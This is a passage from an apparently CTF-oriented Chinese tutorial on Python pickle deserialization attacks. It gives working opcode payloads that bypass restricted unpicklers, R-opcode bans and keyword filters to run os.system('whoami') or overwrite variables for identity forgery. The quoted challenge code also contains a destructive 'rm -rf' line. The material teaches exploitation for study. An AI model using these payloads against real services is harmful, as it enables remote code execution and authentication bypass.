<pre><code class="hljs py">BINPUT         = <span class="hljs-string">b'q'</span>   <span class="hljs-comment">#   "     "    "   "   " ;   "    " 1-byte arg</span></code></pre>
<p>构造思路和<code>Protocol 0</code>类似，我们构造出pickle.loads()函数</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle
 
opcode=<span class="hljs-string">b"\x80\x03cbuiltins\ngetattr\n(cbuiltins\ngetattr\ncbuiltins\ndict\nX\x03\x00\x00\x00get\x86R(cbuiltins\nglobals\n)RS'pickle'\ntRS'loads'\ntR."</span>
<span class="hljs-built_in">print</span>(pickle.loads(opcode))
 
<span class="hljs-comment">###</span>
&lt;built-<span class="hljs-keyword">in</span> function loads&gt;</code></pre>
<p>这上述的构造pickle.loads真心看不懂。。。。接着我们生成要执行的Payload</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle
<span class="hljs-keyword">import</span> os
 
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Command</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):
        command=<span class="hljs-string">"whoami"</span>
        <span class="hljs-keyword">return</span> (os.system,(command,))
 
op=Command()
opcode=pickle.dumps(op,protocol=<span class="hljs-number">0</span>)
<span class="hljs-built_in">print</span>(opcode)
 
<span class="hljs-comment">###</span>
<span class="hljs-string">b'cnt\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.'</span></code></pre>
<p>由于loads()函数接受的是byte类型参数，为了方便构造，我们先手动看一下<code>pickle.loads(payload)</code>的字节码，方便我们后续构造</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle
<span class="hljs-keyword">import</span> pickletools
 
<span class="hljs-keyword">class</span> <span class="hljs-title class_">bin</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">return</span> (pickle.loads,(<span class="hljs-string">b'''cos\nsystem\n(S'whoami'\ntR.'''</span>,))
 
b=<span class="hljs-built_in">bin</span>()
<span class="hljs-comment"># b=b'abcdef'</span>
opcode=pickle.dumps(b,protocol=<span class="hljs-number">3</span>)
<span class="hljs-built_in">print</span>(opcode)
pickletools.dis(opcode)
 
<span class="hljs-comment">###</span>
<span class="hljs-string">b"\x80\x03c_pickle\nloads\nq\x00C\x19cos\nsystem\n(S'whoami'\ntR.q\x01\x85q\x02Rq\x03."</span>
    <span class="hljs-number">0</span>: \x80 PROTO      <span class="hljs-number">3</span>
    <span class="hljs-number">2</span>: c    GLOBAL     <span class="hljs-string">'_pickle loads'</span>
   <span class="hljs-number">17</span>: q    BINPUT     <span class="hljs-number">0</span>
   <span class="hljs-number">19</span>: C    SHORT_BINBYTES <span class="hljs-string">b"cos\nsystem\n(S'whoami'\ntR."</span>
   <span class="hljs-number">46</span>: q    BINPUT     <span class="hljs-number">1</span>
   <span class="hljs-number">48</span>: \x85 TUPLE1
   <span class="hljs-number">49</span>: q    BINPUT     <span class="hljs-number">2</span>
   <span class="hljs-number">51</span>: R    REDUCE
   <span class="hljs-number">52</span>: q    BINPUT     <span class="hljs-number">3</span>
   <span class="hljs-number">54</span>: .    STOP
highest protocol among opcodes = <span class="hljs-number">3</span></code></pre>
<p>这里使用了字节码<code>C</code>代表byte类型，然后后面跟上数据长度的十六进制即可，我们将加粗部分<code>C\x19cos\nsystem\n(S'whoami'\ntR.</code>和上文构造好的<code>pickle.loads()</code>函数合并即可，完整payload如下。</p>
<pre><code class="hljs py">opcode=<span class="hljs-string">b"\x80\x03cbuiltins\ngetattr\n(cbuiltins\ngetattr\ncbuiltins\ndict\nX\x03\x00\x00\x00get\x86R(cbuiltins\nglobals\n)RS'pickle'\ntRS'loads'\ntRC\x19cos\nsystem\n(S'whoami'\ntR.\x85R."</span></code></pre>
<p>测试绕过</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle
<span class="hljs-keyword">import</span> io
<span class="hljs-keyword">import</span> builtins
 
<span class="hljs-keyword">class</span> <span class="hljs-title class_">RestrictedUnpickler</span>(pickle.Unpickler):
    blacklist = {<span class="hljs-string">'eval'</span>, <span class="hljs-string">'exec'</span>, <span class="hljs-string">'execfile'</span>, <span class="hljs-string">'compile'</span>, <span class="hljs-string">'open'</span>, <span class="hljs-string">'input'</span>, <span class="hljs-string">'__import__'</span>, <span class="hljs-string">'exit'</span>}
 
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):
        <span class="hljs-comment"># Only allow safe classes from builtins.</span>
        <span class="hljs-keyword">if</span> module == <span class="hljs-string">"builtins"</span> <span class="hljs-keyword">and</span> name <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.blacklist:
            <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(builtins, name)
        <span class="hljs-comment"># Forbid everything else.</span>
        <span class="hljs-keyword">raise</span> pickle.UnpicklingError(<span class="hljs-string">"global '%s.%s' is forbidden"</span> %
                                     (module, name))
 
<span class="hljs-keyword">def</span> <span class="hljs-title function_">restricted_loads</span>(<span class="hljs-params">s</span>):
    <span class="hljs-string">"""Helper function analogous to pickle.loads()."""</span>
    <span class="hljs-keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()
 
opcode2=opcode=<span class="hljs-string">b"\x80\x03cbuiltins\ngetattr\n(cbuiltins\ngetattr\ncbuiltins\ndict\nX\x03\x00\x00\x00get\x86R(cbuiltins\nglobals\n)RS'pickle'\ntRS'loads'\ntRC\x19cos\nsystem\n(S'whoami'\ntR.\x85R."</span>
restricted_loads(opcode2)
 
<span class="hljs-comment">###</span>
xiaoh\<span class="hljs-number">34946</span></code></pre>
<p>思路二虽然相比思路一稍许麻烦，但是我们通过构造pickle.loads()来<code>*unpickle*</code>任意opcode。虽然find_class会对字节码<code>c</code>导入模块的时候进行检查，但我们构造pickle.loads()时并没有违反find_class的规则。并且当调用我们构造的字节码形式的pickle.loads(payloads)时，并不会触发find_class。所以只要我们能够构造出<code>pickle.loads()</code>，理论上我们是可以执行任意字节码的。</p>
<h2 id="72-绕过r指令">7.2 绕过R指令</h2>
<p>以上方法虽然能够绕过对<code>module</code>和一些危险函数的限制，但本质上仍然是对<code>__reduce__</code>函数的延伸。倘若将字节码<code>R</code>也禁用了，那我们怎么进行RCE呢？</p>
<p>如果你还记得我上文所说的pickle漏洞命令执行的几种方法的话，你肯定能立即想到和函数执行有关的字节码<code>R</code>、<code>i</code>、<code>o</code>。实际上，如果没有<code>R</code>指令，我们同样能够进行函数执行。有下面这样一个例子</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle
<span class="hljs-keyword">import</span> stao
 
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, category</span>):
        self.name = name
        self.category = category
 
 
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, other</span>):
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">type</span>(other) <span class="hljs-keyword">is</span> Animal <span class="hljs-keyword">and</span> self.name == other.name <span class="hljs-keyword">and</span> self.category == other.category
<span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">data</span>):
    <span class="hljs-keyword">if</span> <span class="hljs-string">b'R'</span> <span class="hljs-keyword">in</span> data:
        <span class="hljs-keyword">return</span> <span class="hljs-string">'no reduce!'</span>
    x=pickle.loads(data)
    <span class="hljs-keyword">if</span>(x!= Animal(stao.name,stao.age)):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">'not equal'</span>)
        <span class="hljs-keyword">return</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'well done! {} {}'</span>.<span class="hljs-built_in">format</span>(stao.name,stao.age))</code></pre>
<pre><code class="hljs py"><span class="hljs-comment">#stao.py</span>
 
name=<span class="hljs-string">"stao"</span>
age=<span class="hljs-number">18</span></code></pre>
<p>这里禁用了R指令，但是我们仍有方法初始化一个Animal对象。上文提到过，使用R指令实例化对象的过程，实际上就是调用构造函数的过程，本质上也是函数执行，所以我们同样能够使用其他指令绕过。</p>
<h3 id="i指令">i指令</h3>
<p>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</p>
<pre><code class="hljs py">opcode=<span class="hljs-string">b'''(S'stao'</span>
<span class="hljs-string">I18</span>
<span class="hljs-string">i__main__</span>
<span class="hljs-string">Animal</span>
<span class="hljs-string">.'''</span></code></pre>
<h3 id="o指令">o指令</h3>
<p>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</p>
<pre><code class="hljs py">opcode=<span class="hljs-string">b'''(c__main__</span>
<span class="hljs-string">Animal</span>
<span class="hljs-string">S'stao'</span>
<span class="hljs-string">I18</span>
<span class="hljs-string">o.'''</span></code></pre>
<p>假如这里我们不知道<code>stao</code>模块的内容，我们可以通过变量覆盖的方式将原有stao中的变量覆盖掉。</p>
<pre><code class="hljs py">opcode=<span class="hljs-string">b'''c__main__</span>
<span class="hljs-string">stao</span>
<span class="hljs-string">(S'name'</span>
<span class="hljs-string">S'Hacker'</span>
<span class="hljs-string">S'age'</span>
<span class="hljs-string">I18</span>
<span class="hljs-string">db(c__main__</span>
<span class="hljs-string">Animal</span>
<span class="hljs-string">S'Hacker'</span>
<span class="hljs-string">I18</span>
<span class="hljs-string">o.'''</span></code></pre>
<h3 id="b指令">b指令</h3>
<p>其实我们在上文已经使用过了<code>b</code>指令，当时他的作用是用来更新栈上的一个字典进行变量覆盖。实际上官方对它的解释是<code>BUILD</code>，当PVM解析到<code>b</code>指令时执行<code>__setstate__</code>或者<code>__dict__.update()</code>。</p>
<pre><code class="hljs py">BUILD          = <span class="hljs-string">b'b'</span>   <span class="hljs-comment"># call __setstate__ or __dict__.update()</span></code></pre>
<p>那什么是<code>__setstate__</code>呢？<a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3.7/library/pickle.html#handling-stateful-objects">官方文档</a>中，如果想要存储对象的状态，就可以使用<code>__getstat__</code>和<code>__setstat__</code>方法。由于<em>pickle</em>同样可以存储对象属性的状态，所以这两个魔术方法主要是针对那些不可被序列化的状态，如一个被打开的文件句柄<code>open(file,'r')</code>。</p>
<p>我们来看下面的例子</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle
 
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age=<span class="hljs-number">0</span></span>):
        self.name = name
        self.age = age
 
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__str__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">return</span> <span class="hljs-string">f"name: <span class="hljs-subst">{self.name}</span>\nage: <span class="hljs-subst">{self.age}</span>"</span>
 
 
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Child</span>(<span class="hljs-title class_ inherited__">Person</span>):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__setstate__</span>(<span class="hljs-params">self, state</span>):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"invoke __setstate__"</span>)
        self.name=state
        self.age=<span class="hljs-number">10</span>
 
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__getstate__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"invoke __getstate__"</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-string">"Child"</span>
 
 
c1=Child(<span class="hljs-string">"TEST"</span>)
<span class="hljs-built_in">print</span>(c1)
<span class="hljs-comment">#name: TEST</span>
<span class="hljs-comment">#age: 0</span>
 
 
opcode=pickle.dumps(c1,protocol=<span class="hljs-number">0</span>)
<span class="hljs-built_in">print</span>(opcode)
<span class="hljs-comment">#invoke __getstate__</span>
<span class="hljs-comment">#b'ccopy_reg\n_reconstructor\np0\n(c__main__\nChild\np1\nc__builtin__\nobject\np2\nNtp3\nRp4\nVChild\np5\nb.'</span>
 
c2=pickle.loads(opcode)
<span class="hljs-built_in">print</span>(c2)
<span class="hljs-comment">#invoke __setstate__</span>
<span class="hljs-comment">#name: Child</span>
<span class="hljs-comment">#age: 10</span></code></pre>
<p>当对象被序列化时调用<code>__getstate__</code>，被反序列化时调用<code>__setstate__</code>。重写时可以省略<code>__setstate__</code>，但<code>__getstate__</code>必须返回一个字典。如果<code>__getstate__</code>与<code>__setstate__</code>都被省略, 那么就默认自动保存和加载对象的属性字典<code>__dict__</code>。</p>
<p>在pickle源码中，字节码<code>b</code>对应的是<code>load_build()</code>函数</p>
<pre><code class="hljs py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_build</span>(<span class="hljs-params">self</span>):
    stack = self.stack
    state = stack.pop()
    <span class="hljs-comment">#首先获取栈上的字节码b前的一个元素，对于对象来说，该元素一般是存储有对象属性的dict</span>
    inst = stack[-<span class="hljs-number">1</span>]
    <span class="hljs-comment">#获取该字典中键名为"__setstate__"的value</span>
    setstate = <span class="hljs-built_in">getattr</span>(inst, <span class="hljs-string">"__setstate__"</span>, <span class="hljs-literal">None</span>)
    <span class="hljs-comment">#如果存在，则执行value(state)</span>
    <span class="hljs-keyword">if</span> setstate <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
        setstate(state)
        <span class="hljs-keyword">return</span>
    slotstate = <span class="hljs-literal">None</span>
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(state, <span class="hljs-built_in">tuple</span>) <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(state) == <span class="hljs-number">2</span>:
        state, slotstate = state
    <span class="hljs-comment">#如果"__setstate__"为空，则state与对象默认的__dict__合并，这一步其实就是将序列化前保存的持久化属性和对象属性字典合并</span>
    <span class="hljs-keyword">if</span> state:
        inst_dict = inst.__dict__
        intern = sys.intern
        <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> state.items():
            <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(k) <span class="hljs-keyword">is</span> <span class="hljs-built_in">str</span>:
                inst_dict[intern(k)] = v
            <span class="hljs-keyword">else</span>:
                inst_dict[k] = v
    <span class="hljs-comment">#如果__setstate__和__getstate__都没有设置，则加载默认__dict__</span>
    <span class="hljs-keyword">if</span> slotstate:
        <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> slotstate.items():
            <span class="hljs-built_in">setattr</span>(inst, k, v)
dispatch[BUILD[<span class="hljs-number">0</span>]] = load_build</code></pre>
<p>那么这有什么安全问题呢？如果我们将字典<code>{"__setstate__":os.system}</code>，压入栈中，并执行<code>b</code>字节码，，由于此时并没有<code>__setstate__</code>，所以这里b字节码相当于执行了<code>__dict__.update</code>，向对象的属性字典中添加了一对新的键值对。如果我们继续向栈中压入命令command，再次执行<code>b</code>字节码时，由于已经有了<code>__setstate__</code>，所以会将栈中字节码<code>b</code>的前一个元素当作<code>state</code>，执行<code>__setstate__(state)</code>，也就是<code>os.system(command)</code>。</p>
<p>Payload如下</p>
<pre><code class="hljs py">opcode=<span class="hljs-string">b'''(c__main__</span>
<span class="hljs-string">Animal</span>
<span class="hljs-string">S'Casual'</span>
<span class="hljs-string">I18</span>
<span class="hljs-string">o}(S"__setstate__"    #向栈中压入一个空字典，然后再通过u修改为{"__setstate__":os.system}</span>
<span class="hljs-string">cos</span>
<span class="hljs-string">system</span>
<span class="hljs-string">ubS"whoami"</span>
<span class="hljs-string">b.'''</span></code></pre>
<p>执行结果如下，成功RCE</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle
<span class="hljs-keyword">import</span> stao
<span class="hljs-keyword">import</span> pickletools
 
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, category</span>):
        self.name = name
        self.category = category
 
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, other</span>):
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">type</span>(other) <span class="hljs-keyword">is</span> Animal <span class="hljs-keyword">and</span> self.name == other.name <span class="hljs-keyword">and</span> self.category == other.category
<span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">data</span>):
    <span class="hljs-keyword">if</span> <span class="hljs-string">b'R'</span> <span class="hljs-keyword">in</span> data:
        <span class="hljs-keyword">return</span> <span class="hljs-string">'no reduce!'</span>
    x=pickle.loads(data)
    <span class="hljs-keyword">if</span>(x!= Animal(stao.name,stao.age)):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">'not equal'</span>)
        <span class="hljs-keyword">return</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'well done! {} {}'</span>.<span class="hljs-built_in">format</span>(stao.name,stao.age))
 
opcode=<span class="hljs-string">b'''(c__main__</span>
<span class="hljs-string">Animal</span>
<span class="hljs-string">S'Casual'</span>
<span class="hljs-string">I18</span>
<span class="hljs-string">o}(S"__setstate__"</span>
<span class="hljs-string">cos</span>
<span class="hljs-string">system</span>
<span class="hljs-string">ubS"whoami"</span>
<span class="hljs-string">b.'''</span>
check(opcode)
pickletools.dis(opcode)
 
<span class="hljs-comment">###</span>
xiaoh\<span class="hljs-number">34946</span>
<span class="hljs-keyword">not</span> equal
    <span class="hljs-number">0</span>: (    MARK
    <span class="hljs-number">1</span>: c        GLOBAL     <span class="hljs-string">'__main__ Animal'</span>
   <span class="hljs-number">18</span>: S        STRING     <span class="hljs-string">'Casual'</span>
   <span class="hljs-number">28</span>: I        INT        <span class="hljs-number">18</span>
   <span class="hljs-number">32</span>: o        OBJ        (MARK at <span class="hljs-number">0</span>)
   <span class="hljs-number">33</span>: }    EMPTY_DICT
   <span class="hljs-number">34</span>: (    MARK
   <span class="hljs-number">35</span>: S        STRING     <span class="hljs-string">'__setstate__'</span>
   <span class="hljs-number">51</span>: c        GLOBAL     <span class="hljs-string">'os system'</span>
   <span class="hljs-number">62</span>: u        SETITEMS   (MARK at <span class="hljs-number">34</span>)
   <span class="hljs-number">63</span>: b    BUILD
   <span class="hljs-number">64</span>: S    STRING     <span class="hljs-string">'whoami'</span>
   <span class="hljs-number">74</span>: b    BUILD
   <span class="hljs-number">75</span>: .    STOP
highest protocol among opcodes = <span class="hljs-number">1</span></code></pre>
<h2 id="73-绕过关键字过滤">7.3 绕过关键字过滤</h2>
<p>在某些情况下，假如我们想利用opcode进行变量覆盖从而进行身份伪造，但是代码中过滤了我们想要覆盖的属性关键字。比如[2022强网杯 crash]，关键代码如下</p>
<pre><code class="hljs py"><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, username,password</span>):
        self.username=username
        self.token=<span class="hljs-built_in">hash</span>(password)
 
 
<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/balancer'</span>, methods=[<span class="hljs-string">'GET'</span>, <span class="hljs-string">'POST'</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>():
    pickle_data=base64.b64decode(request.cookies.get(<span class="hljs-string">"userdata"</span>))
    <span class="hljs-keyword">if</span> <span class="hljs-string">b'R'</span> <span class="hljs-keyword">in</span> pickle_data <span class="hljs-keyword">or</span> <span class="hljs-string">b"secret"</span> <span class="hljs-keyword">in</span> pickle_data:
        <span class="hljs-keyword">return</span> <span class="hljs-string">"You damm hacker!"</span>
    os.system(<span class="hljs-string">"rm -rf *py*"</span>)
    userdata=pickle.loads(pickle_data)
    <span class="hljs-keyword">if</span> userdata.token!=<span class="hljs-built_in">hash</span>(get_password(userdata.username)):
         <span class="hljs-keyword">return</span> <span class="hljs-string">"Login First"</span>
    <span class="hljs-keyword">if</span> userdata.username==<span class="hljs-string">'admin'</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">"Welcome admin, here is your next challenge!"</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">"You're not admin!"</span></code></pre>
<p>源码引入<code>admin</code>模块，其中存放了属性<code>secret</code>。现在题目过滤了属性名，现在如何进行绕过呢？下面给出三种思路</p>
<h3 id="利用v指令进行unicode绕过">利用V指令进行Unicode绕过</h3>
<pre><code class="hljs py">V`指令的用法如下，类似于指令`S</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231117190758654.png" alt="image-20231117190758654"></p>
<p>正常我们可以构造变量覆盖如下来绕过比较</p>
<pre><code class="hljs py"><span class="hljs-string">b'''capp</span>
<span class="hljs-string">admin</span>
<span class="hljs-string">(S'secret'</span>
<span class="hljs-string">I1</span>
<span class="hljs-string">db0(capp</span>
<span class="hljs-string">User</span>
<span class="hljs-string">S"admin"</span>
<span class="hljs-string">I1</span>
<span class="hljs-string">o.'''</span></code></pre>
<p>过滤了secret之后可以构造如下</p>
<pre><code class="hljs py"><span class="hljs-string">b'''capp</span>
<span class="hljs-string">admin</span>
<span class="hljs-string">(Vsecr\u0065t</span>
<span class="hljs-string">I1</span>
<span class="hljs-string">db0(capp</span>
<span class="hljs-string">User</span>
<span class="hljs-string">S"admin"</span>
<span class="hljs-string">I1</span>
<span class="hljs-string">o.'''</span></code></pre>
<h3 id="十六进制绕过">十六进制绕过</h3>
<p>操作码<code>S</code>也能够识别十六进制字符串，可以构造如下</p>
<pre><code class="hljs py"><span class="hljs-string">b'''capp</span>
<span class="hljs-string">admin</span>
<span class="hljs-string">(S'\x73ecret'</span>
<span class="hljs-string">I1</span>
<span class="hljs-string">db0(capp</span>
<span class="hljs-string">User</span>
<span class="hljs-string">S"admin"</span>
<span class="hljs-string">I1</span>
<span class="hljs-string">o.'''</span></code></pre>
<h3 id="利用内置函数获取关键字">利用内置函数获取关键字</h3>
<p>对于已导入的模块，我们可以通过<code>sys.modules['xxx']</code>来获取该模块，然后通过<a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3.7/library/functions.html">内置函数</a>dir()来列出模块中的所有属性</p>
<pre><code class="hljs py"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">dir</span>(sys.modules[<span class="hljs-string">'admin'</span>]))
 
<span class="hljs-comment">#['__builtins__', '__cached__', '__doc__', '__file__', '__loader__', '__name__', '__package__', '__spec__', 'secret']</span></code></pre>
<p>可以看到模块中的属性是以列表的形式输出，且我们所需的字符串位于列表末尾。</p>
<p>由于pickle不支持列表索引、字典索引，所以我们不能直接获取所需的字符串。在Python中，我们可以通过<code>reversed()</code>函数来将列表逆序，并返回一个迭代对象</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231117190837401.png" alt="image-20231117190837401"></p>
<p>然后我们可以通过<code>next()</code>函数来获取迭代对象的下一个元素，默认从第一个元素开始。最终可以构造如下</p>
<pre><code class="hljs py"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>(<span class="hljs-built_in">reversed</span>(<span class="hljs-built_in">dir</span>(sys.modules[<span class="hljs-string">'admin'</span>]))))
 
<span class="hljs-comment">#secret</span></code></pre>
<p>这类似PHP的无参数RCE</p>
<p>opcode构造如下</p>
<pre><code class="hljs py">opcode=<span class="hljs-string">b'''(((((c__main__</span>
<span class="hljs-string">admin</span>
<span class="hljs-string">i__builtin__</span>
<span class="hljs-string">dir</span>
<span class="hljs-string">i__builtin__</span>
<span class="hljs-string">reversed</span>
<span class="hljs-string">i__builtin__</span>
<span class="hljs-string">next</span>
<span class="hljs-string">.'''</span>
<span class="hljs-built_in">print</span>(pickle.loads(opcode))
 
<span class="hljs-comment">#secret</span></code></pre>
<p>获取到了secret字符串，下面就容易构造变量覆盖了</p>
<pre><code class="hljs py">opcode = <span class="hljs-string">b'''c__main__</span>
<span class="hljs-string">admin</span>
<span class="hljs-string">(((((c__main__</span>
<span class="hljs-string">admin</span>
<span class="hljs-string">i__builtin__</span>
<span class="hljs-string">dir</span>
<span class="hljs-string">i__builtin__</span>
<span class="hljs-string">reversed</span>
<span class="hljs-string">i__builtin__</span>
<span class="hljs-string">next</span>
<span class="hljs-string">I1</span>
<span class="hljs-string">db(S'admin'</span>
<span class="hljs-string">I1</span>
<span class="hljs-string">i__main__</span>
<span class="hljs-string">User</span>
<span class="hljs-string">.'''</span></code></pre>
<h1 id="0x08-pker使用说明">0x08 pker使用说明</h1>
<h2 id="81-简介">8.1 简介</h2>
<ul>
<li>pker是由@eddieivan01编写的以仿照Python的形式产生pickle opcode的解析器，可以在<a target="_blank" rel="noopener" href="https://github.com/eddieivan01/pker%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81%E3%80%82">https://github.com/eddieivan01/pker下载源码。</a></li>
<li>使用pker，我们可以更方便地编写pickle opcode（生成pickle版本0的opcode）。</li>
<li>再次建议，在能够手写opcode的情况下使用pker进行辅助编写，不要过分依赖pker。</li>
<li>此外，pker的实现用到了python的ast（抽象语法树）库，抽象语法树也是一个很重要东西，有兴趣的可以研究一下ast库和pker的源码，由于篇幅限制，这里不再叙述。</li>
</ul>
<h2 id="82-pker能做的事">8.2 pker能做的事</h2>
<p>引用自<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7012#toc-5%EF%BC%9A">https://xz.aliyun.com/t/7012#toc-5：</a></p>
<blockquote>
<ul>
<li>变量赋值：存到memo中，保存memo下标和变量名即可</li>
<li>函数调用</li>
<li>类型字面量构造</li>
<li>list和dict成员修改</li>
<li>对象成员变量修改</li>
</ul>
</blockquote>
<p>具体来讲，可以使用pker进行原变量覆盖、函数执行、实例化新的对象。</p>
<h2 id="83-使用方法与示例">8.3 使用方法与示例</h2>
<ol>
<li>pker中的针对pickle的特殊语法需要重点掌握（后文给出示例）</li>
<li>此外我们需要注意一点：python中的所有类、模块、包、属性等都是对象，这样便于对各操作进行理解。</li>
<li>pker主要用到<code>GLOBAL、INST、OBJ</code>三种特殊的函数以及一些必要的转换方式，其他的opcode也可以手动使用：</li>
</ol>
<pre><code class="hljs py">以下module都可以是包含`.`的子module
调用函数时，注意传入的参数类型要和示例一致
对应的opcode会被生成，但并不与pker代码相互等价

GLOBAL
对应opcode：<span class="hljs-string">b'c'</span>
获取module下的一个全局对象（没有<span class="hljs-keyword">import</span>的也可以，比如下面的os）：
GLOBAL(<span class="hljs-string">'os'</span>, <span class="hljs-string">'system'</span>)
输入：module,instance(<span class="hljs-built_in">callable</span>、module都是instance)  

INST
对应opcode：<span class="hljs-string">b'i'</span>
建立并入栈一个对象（可以执行一个函数）：
INST(<span class="hljs-string">'os'</span>, <span class="hljs-string">'system'</span>, <span class="hljs-string">'ls'</span>)  
输入：module,<span class="hljs-built_in">callable</span>,para 

OBJ
对应opcode：<span class="hljs-string">b'o'</span>
建立并入栈一个对象（传入的第一个参数为<span class="hljs-built_in">callable</span>，可以执行一个函数））：
OBJ(GLOBAL(<span class="hljs-string">'os'</span>, <span class="hljs-string">'system'</span>), <span class="hljs-string">'ls'</span>) 
输入：<span class="hljs-built_in">callable</span>,para

xxx(xx,...)
对应opcode：<span class="hljs-string">b'R'</span>
使用参数xx调用函数xxx（先将函数入栈，再将参数入栈并调用）

li[<span class="hljs-number">0</span>]=<span class="hljs-number">321</span>
或
globals_dic[<span class="hljs-string">'local_var'</span>]=<span class="hljs-string">'hello'</span>
对应opcode：<span class="hljs-string">b's'</span>
更新列表或字典的某项的值

xx.attr=<span class="hljs-number">123</span>
对应opcode：<span class="hljs-string">b'b'</span>
对xx对象进行属性设置

<span class="hljs-keyword">return</span>
对应opcode：<span class="hljs-string">b'0'</span>
出栈（作为pickle.loads函数的返回值）：
<span class="hljs-keyword">return</span> xxx <span class="hljs-comment"># 注意，一次只能返回一个对象或不返回对象（就算用逗号隔开，最后也只返回一个元组）</span></code></pre>
<p>注意：</p>
<ol>
<li>由于opcode本身的功能问题，pker肯定也不支持列表索引、字典索引、点号取对象属性作为<strong>左值</strong>，需要索引时只能先获取相应的函数（如<code>getattr</code>、<code>dict.get</code>）才能进行。但是因为存在<code>s</code>、<code>u</code>、<code>b</code>操作符，<strong>作为右值是可以的</strong>。即“查值不行，赋值可以”。</li>
<li>pker解析<code>S</code>时，用单引号包裹字符串。所以pker代码中的双引号会被解析为单引号opcode:</li>
</ol>
<pre><code class="hljs py">test=<span class="hljs-string">"123"</span>
<span class="hljs-keyword">return</span> test</code></pre>
<p>被解析为：</p>
<pre><code class="hljs py"><span class="hljs-string">b"S'123'\np0\n0g0\n."</span></code></pre>
<h3 id="pker全局变量覆盖">pker：全局变量覆盖</h3>
<ul>
<li>覆盖直接由执行文件引入的<code>secret</code>模块中的<code>name</code>与<code>category</code>变量：</li>
</ul>
<pre><code class="hljs py">secret=GLOBAL(<span class="hljs-string">'__main__'</span>, <span class="hljs-string">'secret'</span>) 
<span class="hljs-comment"># python的执行文件被解析为__main__对象，secret在该对象从属下</span>
secret.name=<span class="hljs-string">'1'</span>
secret.category=<span class="hljs-string">'2'</span></code></pre>
<ul>
<li>覆盖引入模块的变量：</li>
</ul>
<pre><code class="hljs py">game = GLOBAL(<span class="hljs-string">'guess_game'</span>, <span class="hljs-string">'game'</span>)
game.curr_ticket = <span class="hljs-string">'123'</span></code></pre>
